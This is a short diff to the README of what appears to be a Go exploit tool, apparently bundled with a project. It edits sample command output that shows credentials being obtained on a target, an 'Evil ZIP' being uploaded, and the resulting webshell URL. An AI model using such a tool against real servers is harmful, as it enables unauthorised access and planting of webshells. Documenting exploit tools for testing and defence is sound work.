@@ -277,7 +277,7 @@ $ go run main.go -p http://127.0.0.1:8080 -u http://example.com:8881
 [INFO] Target: http://example.com:8881
 [INFO] Proxy: http://127.0.0.1:8080
 [INFO] JSESSIONID: 4D23D1A593332723043CE44C98BEBF84
-[INFO] 登录成功，用户名/密码: h20di/tgq1cu69
+[INFO] 用户名/密码: h20di/tgq1cu69
 ```
 
 Webshell文件上传利用。
@@ -299,7 +299,7 @@ $ go run main.go -p http://127.0.0.1:8080 -u http://example.com:8881 -f shell.js
 [INFO] Target: http://example.com:8881
 [INFO] Proxy: http://127.0.0.1:8080
 [INFO] JSESSIONID: 6BEDF380C75C6E0FD871119CBF1CF40C
-[INFO] 登录成功，用户名/密码: oqlmx/a9x3pcui
-[INFO] 上传恶意ZIP文件中……
+[INFO] Username/Password: oqlmx/a9x3pcui
+[INFO] Uploading Evil ZIP file...
 [INFO] Webshell: http://example.com:8881/upload/sdad3d3o6.jsp
 ```
